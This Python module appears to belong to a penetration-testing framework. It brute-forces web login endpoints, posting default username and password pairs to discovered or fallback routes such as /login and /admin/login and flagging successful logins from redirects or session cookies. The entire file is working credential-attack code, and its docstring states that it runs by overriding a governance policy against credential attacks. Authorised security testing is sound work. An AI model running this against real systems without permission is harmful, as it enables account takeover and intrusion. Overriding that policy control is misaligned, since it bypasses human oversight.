from aegisx.core import http_client as requests
from typing import Dict, Any, List
from aegisx.core.ui.console import ConsoleUI
from aegisx.core.orchestration.dag_engine import WorkflowState

class WebAuthBruteForcer:
    """
    ACTIVE EXPLOITATION MODULE: Web Authentication Brute Forcer.
    Requires explicit OVERRIDE of the NO_CREDENTIAL_ATTACKS governance policy.
    """
    
    def __init__(self):
        # Extremely small dictionary for safety and speed
        self.usernames = ["admin", "root", "user", "test"]
        self.passwords = ["admin", "password", "123456", "admin123"]
        
    def execute_bruteforce(self, target: str, auth_routes: List[str]) -> Dict[str, Any]:
        """
        Attempts to brute-force discovered authentication endpoints.
        """
        ConsoleUI.error("WARNING: EXECUTING ACTIVE CREDENTIAL ATTACK (POLICY OVERRIDE)")
        
        compromised_credentials = []
        
        for route in auth_routes:
            url = f"http://{target}{route}"
            ConsoleUI.info(f"Targeting authentication endpoint: {url}")
            
            for user in self.usernames:
                for pwd in self.passwords:
                    ConsoleUI.stream_line(f"Testing {user}:{pwd}")
                    
                    try:
                        # Attempt standard form submission
                        resp = requests.post(url, data={"username": user, "password": pwd}, timeout=3, allow_redirects=False)
                        
                        # Heuristics for successful login:
                        # 1. 302 Redirect to a dashboard
                        # 2. 200 OK but sets a session cookie (and isn't the login page again)
                        if resp.status_code in [301, 302, 303]:
                            if "location" in resp.headers and "login" not in resp.headers["location"].lower():
                                compromised_credentials.append({"route": route, "username": user, "password": pwd})
                                ConsoleUI.success(f"CRITICAL: Compromised credentials found! {user}:{pwd}")
                                break # Stop testing passwords for this user
                                
                        elif resp.status_code == 200 and "Set-Cookie" in resp.headers:
                            # Verify we aren't just getting the login page back with a CSRF token
                            if "invalid" not in resp.text.lower() and "incorrect" not in resp.text.lower():
                                compromised_credentials.append({"route": route, "username": user, "password": pwd})
                                ConsoleUI.success(f"CRITICAL: Compromised credentials found! {user}:{pwd}")
                                break
                    except:
                        pass
                        
        return {
            "attack_executed": True,
            "compromised_credentials": compromised_credentials,
            "risk_level": "CRITICAL" if compromised_credentials else "SAFE"
        }

def phase_18_active_bruteforce(state: WorkflowState) -> WorkflowState:
    """
    PHASE 18: Active Validation
    Executes the credential brute forcer if permitted.
    """
    ConsoleUI.header("PHASE 18: ACTIVE BRUTEFORCE VALIDATION")
    
    # We need to extract auth routes. For simplicity, we just check if any route has 'login' or 'admin'
    auth_routes = []
    for item in state.evidence_ledger:
        if item.get("stage") == "PHASE_6_ROUTE_DISCOVERY":
            routes = item.get("result", {}).get("raw_output", [])
            for r in routes:
                url_path = r.get("url", "") if isinstance(r, dict) else r
                if "login" in url_path.lower() or "admin" in url_path.lower():
                    # Extract just the path part
                    path = url_path.replace(f"http://{state.normalized_target}", "").replace(f"https://{state.normalized_target}", "")
                    auth_routes.append(path)
                    
    if not auth_routes:
        # Fallback dummy routes if none found in evidence
        auth_routes = ["/login", "/admin/login", "/api/v1/auth/login"]
        
    bruteforcer = WebAuthBruteForcer()
    result = bruteforcer.execute_bruteforce(state.normalized_target, list(set(auth_routes)))
    
    state.evidence_ledger.append({
        "stage": "PHASE_18_ACTIVE_BRUTEFORCE",
        "action": "credential_stuffing",
        "result": result
    })
    
    return state
